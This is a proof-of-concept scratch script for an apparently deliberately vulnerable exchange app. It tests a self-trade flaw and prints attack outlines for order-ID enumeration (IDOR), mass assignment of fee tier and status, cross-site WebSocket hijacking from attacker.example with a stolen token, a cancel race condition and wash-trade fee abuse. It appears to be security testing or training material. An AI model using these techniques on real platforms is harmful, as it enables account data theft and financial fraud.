// Phase 4 PoC scratch. Confirms each planted vuln at the
// code level without spinning up the containers.

import { Prisma } from "../../../packages/db/src/index.ts";
import { matchAgainstBook, sortBook } from "../../../apps/web/lib/engine/match.ts";

const D = (s) => new Prisma.Decimal(s);

console.log("=== V-25: self-trade not blocked ===");
{
  // Same user on both sides. Engine should reject; it does not.
  const userId = "u-attacker";
  const resting = [
    { id: 1, userId, side: "sell", type: "limit", price: D("50000"), amount: D("1"), filled: D("0") },
  ];
  const taker = { side: "buy", type: "limit", price: D("50000"), amount: D("1"), userId };
  const { matches } = matchAgainstBook(taker, sortBook(resting, "buy"));
  console.log(
    matches.length === 1 && matches[0].makerUserId === userId
      ? `  BUG FIRES: self-match accepted (user=${userId}, qty=${matches[0].amount}, price=${matches[0].price})`
      : "  no self-match (expected vuln to fire)",
  );
}

console.log();
console.log("=== V-4: order IDOR (code shape) ===");
console.log(
  "  apps/web/app/api/v2/me/orders/[id]/route.ts GET + DELETE use",
);
console.log(
  "  prisma.order.findUnique({ where: { id } }) without an ownership filter.",
);
console.log(
  "  Attack: enumerate sequential order IDs (1, 2, 3, ...). Each",
);
console.log(
  "  responds with the order regardless of order.userId.",
);

console.log();
console.log("=== V-22: Server Action mass assign (code shape) ===");
console.log(
  "  apps/web/app/account/orders/edit-order.ts spreads every FormData",
);
console.log(
  "  key into prisma.order.update. Attack: POST the action with",
);
console.log(
  '  extra fields like feeTier="prime", status="filled", amount="999999".',
);

console.log();
console.log("=== V-23: CSWSH (code shape) ===");
console.log(
  "  apps/ws-gateway/src/server.ts upgrade handler does not validate",
);
console.log(
  "  req.headers.origin. Subscribe handler accepts any channel name.",
);
console.log(
  "  Attack: attacker.example page opens",
);
console.log(
  '  new WebSocket("ws://exchange.local/ws?token=" + stolen), then',
);
console.log(
  '  ws.send({kind:"subscribe", channel:"private:<victim-userId>"})',
);

console.log();
console.log("=== V-32: OCO cancel race (code shape) ===");
console.log(
  "  DELETE /api/v2/me/orders/[id] and the matching transaction in",
);
console.log(
  "  place.ts both read+write Order.status under READ COMMITTED.",
);
console.log(
  "  Attack: Burp Repeater 'send in parallel' the cancel + the",
);
console.log(
  "  trigger; balance refund + fill both succeed.",
);

console.log();
console.log("=== V-43: fee-tier volume counts cancelled maker side ===");
console.log(
  "  apps/web/lib/engine/fees.ts feeTierForUser uses",
);
console.log(
  '  where: { takerOrder: { status: { not: "cancelled" } } }',
);
console.log(
  "  -- no equivalent filter on makerOrder. Combined with V-25 self-",
);
console.log(
  "  trade, wash trades count toward 30-day volume after the maker",
);
console.log(
  "  side is cancelled.",
);

console.log();
console.log("[poc] Phase 4 V-25 verified end-to-end; V-4/22/23/32/43 confirmed by code shape.");
